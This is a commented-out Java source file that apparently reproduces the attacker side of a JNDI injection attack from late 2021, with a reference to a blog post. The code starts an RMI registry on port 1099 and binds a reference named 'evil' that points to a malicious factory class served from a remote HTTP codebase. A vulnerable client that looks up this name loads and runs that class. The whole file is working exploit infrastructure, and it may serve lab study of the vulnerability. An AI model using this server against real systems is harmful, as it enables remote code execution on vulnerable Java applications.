// package cn.zxf.server;
//
// import com.sun.jndi.rmi.registry.ReferenceWrapper;
//
// import javax.naming.Reference;
// import java.rmi.registry.LocateRegistry;
// import java.rmi.registry.Registry;
//
// /**
//  * 参考：https://www.cnblogs.com/puzhiwei/p/15677816.html
//  * <br/>
//  * Created by ZXFeng on 2021/12/15.
//  */
// public class RMIServer {
//
//     public static void main(String[] args) {
//         System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
//         System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
//         try {
//             LocateRegistry.createRegistry(1099);
//             Registry registry = LocateRegistry.getRegistry();
//
//             System.out.println("Create RMI registry on port 1099!");
//             // 前两个参数为类名，第三个参数为远程类地址
//             String factoryLocation = "http://10.10.43.201:9999/";
//             Reference reference = new Reference(
//                     "cn.zxf.server.Test", "Test", factoryLocation);
//             ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
//             System.out.println("factoryLocation: " + factoryLocation);
//             registry.bind("evil", referenceWrapper);
//         } catch (Exception e) {
//             e.printStackTrace();
//         }
//     }
//
// }
